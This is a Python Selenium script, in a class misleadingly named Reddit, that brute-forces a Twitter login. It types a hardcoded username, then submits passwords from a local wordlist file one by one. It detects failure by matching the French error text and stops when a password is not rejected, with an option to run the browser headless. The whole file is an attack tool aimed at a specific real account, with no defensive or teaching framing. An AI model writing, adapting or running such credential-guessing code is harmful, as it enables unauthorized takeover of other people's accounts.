import selenium
from selenium import webdriver
import time
from bs4 import BeautifulSoup


class Reddit:
    def __init__(self, username, wordlist, hidden=False):
        self.username = username
        self.wordlist = wordlist
        self.hidden = hidden

    def Bruteforce(self):
        global word, passForm
        if self.hidden:
            op = webdriver.ChromeOptions()
            op.add_argument('headless')
            driver = webdriver.Chrome(options=op)
        else:
            driver = webdriver.Chrome()
        driver.get("https://twitter.com/login")
        time.sleep(2)
        userForm = driver.find_element_by_xpath(
            "/html/body/div/div/div/div[2]/main/div/div/div[1]/form/div/div[1]/label/div/div[2]/div/input")
        userForm.send_keys(self.username)
        time.sleep(1)
        end = False
        i = 1

        while not end:
            f = open("test.txt", 'r')
            for word in f:
                try:
                    print(word)
                    passForm = driver.find_element_by_xpath(
                        f"/html/body/div/div/div/div[2]/main/div/div/div[{i}]/form/div/div[2]/label/div/div[2]/div/input")
                    passForm.send_keys(word)
                    time.sleep(0.5)
                    button = driver.find_element_by_xpath(
                        f"/html/body/div/div/div/div[2]/main/div/div/div[{i}]/form/div/div[3]/div/div"
                    )
                    i = 2
                    button.click()
                    time.sleep(2)
                    page = driver.page_source
                    soup = BeautifulSoup(page, 'lxml')
                    error = soup.find_all("span", {'class': 'css-901oao css-16my406 r-1qd0xha r-ad9z0x r-bcqeeo r-qvutc0'})
                    if error[4].text == "Le nom d'utilisateur et le mot de passe que vous avez entrés " \
                                        "ne correspondent pas à ceux présents dans nos fichiers. Veuillez vérifier et réessayer.":
                        print("error")
                    else:
                        print(word)
                        end = True
                    time.sleep(2)
                except selenium.common.exceptions.NoSuchElementException:
                    print("error")
        time.sleep(99)


Reddit('snowy__27', "").Bruteforce()
